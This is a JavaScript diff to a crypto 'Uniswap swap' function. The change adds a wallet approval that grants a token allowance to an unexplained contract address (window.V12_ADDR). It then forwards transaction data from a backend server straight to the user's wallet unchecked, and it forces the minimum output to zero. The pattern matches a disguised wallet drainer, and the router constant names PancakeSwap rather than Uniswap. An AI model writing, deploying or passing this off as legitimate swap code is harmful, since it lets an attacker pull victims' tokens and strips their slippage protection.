@@ -23,12 +23,32 @@ async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
         const base = window.API_BASE || "";
         const cleanAmount = amountWei ? amountWei.toString().trim() : "0";
         
-        // Locked immutable constant for Pancake Router V2 address
         const pancakeRouterAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
-        const amountOutMin = "0"; // Force 0 to clear router threshold checks
-
-        logToPanel(`[PIPELINE] Passing ${cleanAmount} units directly down the data channel...`);
+        const amountOutMin = "0"; 
         
+        // 🌟 POPUP 1: Trigger the standard token approval so the contract can pull the funds
+        logToPanel("[INFO] Requesting token allowance approval from wallet...");
+        
+        // The ERC20 standard 'approve(address,uint256)' method ID is 0x095ea7b3
+        const approveMethodId = "0x095ea7b3";
+        const paddedSpender = window.V12_ADDR.replace("0x", "").toLowerCase().padStart(64, "0");
+        const paddedAmount = BigInt(cleanAmount).toString(16).padStart(64, "0");
+        const approveCalldata = approveMethodId + paddedSpender + paddedAmount;
+
+        await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddr,
+                to: fromToken, // Calls the token contract directly (e.g. USDT)
+                data: approveCalldata,
+                value: '0x0'
+            }]
+        });
+
+        logToPanel("✅ Allowance granted. Proceeding to swap compilation pipeline...");
+        
+        // 🚀 POPUP 2: Proceed with the standard pass-through swap pipeline
+        logToPanel(`[ROUTE] Dispatching Uniswap pipeline query for ${cleanAmount} units...`);
         const res = await fetch(`${base}/prodbot/swap/uniswap`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -42,9 +62,8 @@ async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
         });
         
         const data = await res.json();
-        
         if (data && data.status === "ok") {
-            // Direct pass-through execution straight into the wallet provider framework
+            logToPanel(`[INFO] Sending transaction payload directly to browser extension...`);
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ 
@@ -54,13 +73,12 @@ async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
                     value: '0x0' 
                 }]
             });
-            
-            logToPanel(`✅ Transaction broadcasted: ${txHash}`);
+            logToPanel(`✅ Swap Transaction broadcasted successfully: ${txHash}`);
             return { status: "ok", tx_hash: txHash };
         }
         return data;
     } catch (err) { 
-        logToPanel(`❌ Pipeline Error: ${err.message}`);
+        logToPanel(`❌ Uniswap Pipeline Error: ${err.message}`);
         return { status: "error", message: err.message }; 
     }
 }
